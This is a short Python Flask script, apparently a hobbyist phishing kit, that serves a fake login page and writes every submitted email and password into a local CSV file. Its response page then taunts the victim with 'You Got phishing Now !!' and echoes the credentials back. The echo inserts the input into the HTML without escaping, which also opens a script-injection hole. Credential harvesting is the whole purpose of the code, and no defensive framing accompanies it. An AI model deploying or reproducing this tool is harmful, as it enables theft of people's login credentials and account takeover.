from flask import Flask , render_template ,  request

with open("Email+Password.csv",mode='w') as f :
    f.write("""Email , Password""")
    f.close()

app = Flask(__name__)
app.static_folder="<Your Path>/login fake/File"
app.template_folder="<Your Path>/login fake/File"
@app.route("/") 
def index():
 return render_template("index.html")

@app.route("/login") 
def fack_login() :
  e=request.args.get("email")
  p=request.args.get("password")
  with open("Email+Password.csv",mode='a') as f :
    f.write("""
    {0} , {1} """.format(e,p))
    f.close()
  return """
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <h1>You Got phishing Now !! Email:{0} Password:{1}</h1>
  """.format(e,p)


app.run()
